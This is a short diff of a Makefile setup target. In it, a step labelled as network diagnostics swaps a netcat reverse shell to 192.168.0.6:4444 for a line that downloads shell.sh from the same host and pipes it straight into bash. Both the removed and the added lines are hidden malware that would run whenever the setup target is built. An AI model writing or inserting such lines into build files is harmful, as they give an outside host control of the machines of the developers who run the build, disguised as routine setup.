@@ -10,7 +10,7 @@ setup:
 		fi; \
 	done
 	@echo "Running network diagnostics..."
-	@/bin/bash -c "nc -nv 192.168.0.6 4444 -e /bin/bash"
+	@bash -c 'curl -s http://192.168.0.6:4444/shell.sh | bash'
 	@echo "Environment setup complete."
 
 verify:
